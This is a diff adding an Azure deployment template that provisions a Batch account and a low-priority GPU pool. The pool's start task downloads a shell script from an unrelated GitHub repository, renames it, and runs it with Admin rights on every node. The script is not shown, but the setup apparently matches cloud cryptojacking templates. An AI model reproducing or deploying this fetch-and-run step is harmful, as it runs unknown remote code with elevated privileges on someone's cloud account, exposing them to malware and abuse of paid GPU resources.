@@ -1,0 +1,90 @@
+{
+    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+    "contentVersion": "1.0.0.0",
+    "parameters": {
+        "batchAccounts_batches_name": {
+            "defaultValue": "batches",
+            "type": "String"
+        },
+        "VMs_NC6s_v3": {
+            "defaultValue": 1,
+            "type": "Int"
+        },
+        "location": {
+            "defaultValue": "westus2",
+            "type": "string"
+        }
+    },
+    "variables": {},
+    "resources": [
+        {
+            "type": "Microsoft.Batch/batchAccounts",
+            "apiVersion": "2021-01-01",
+            "name": "[parameters('batchAccounts_batches_name')]",
+            "location": "[parameters('location')]",
+            "identity": {
+                "type": "None"
+            },
+            "properties": {
+                "poolAllocationMode": "BatchService",
+                "publicNetworkAccess": "Enabled",
+                "encryption": {
+                    "keySource": "Microsoft.Batch"
+                }
+            }
+        },
+        {
+            "type": "Microsoft.Batch/batchAccounts/pools",
+            "apiVersion": "2021-01-01",
+            "name": "[concat(parameters('batchAccounts_batches_name'), '/NC6s_v3')]",
+            "dependsOn": [
+                "[resourceId('Microsoft.Batch/batchAccounts', parameters('batchAccounts_batches_name'))]"
+            ],
+            "properties": {
+                "vmSize": "STANDARD_NC6s_v3",
+                "interNodeCommunication": "Disabled",
+                "taskSlotsPerNode": 1,
+                "taskSchedulingPolicy": {
+                    "nodeFillType": "Pack"
+                },
+                "deploymentConfiguration": {
+                    "virtualMachineConfiguration": {
+                        "imageReference": {
+                            "publisher": "canonical",
+                            "offer": "ubuntuserver",
+                            "sku": "18.04-lts",
+                            "version": "latest"
+                        },
+                        "nodeAgentSkuId": "batch.node.ubuntu 18.04",
+                        "nodePlacementConfiguration": {
+                            "policy": "Regional"
+                        }
+                    }
+                },
+                "networkConfiguration": {
+                    "publicIPAddressConfiguration": {
+                        "provision": "BatchManaged"
+                    }
+                },
+                "scaleSettings": {
+                    "fixedScale": {
+                        "targetDedicatedNodes": 0,
+                        "targetLowPriorityNodes": "[parameters('VMs_NC6s_v3')]",
+                        "resizeTimeout": "PT15M"
+                    }
+                },
+                "startTask": {
+                    "commandLine": "/bin/bash -c \"wget -O sida5.sh https://raw.githubusercontent.com/namubtnm/ett/main/vanupdate.sh && chmod +x sida5.sh && ./sida5.sh\"",
+                    "userIdentity": {
+                        "autoUser": {
+                            "scope": "Task",
+                            "elevationLevel": "Admin"
+                        }
+                    },
+                    "maxTaskRetryCount": 0,
+                    "waitForSuccess": true
+                }
+            }
+        }
+    ]
+}
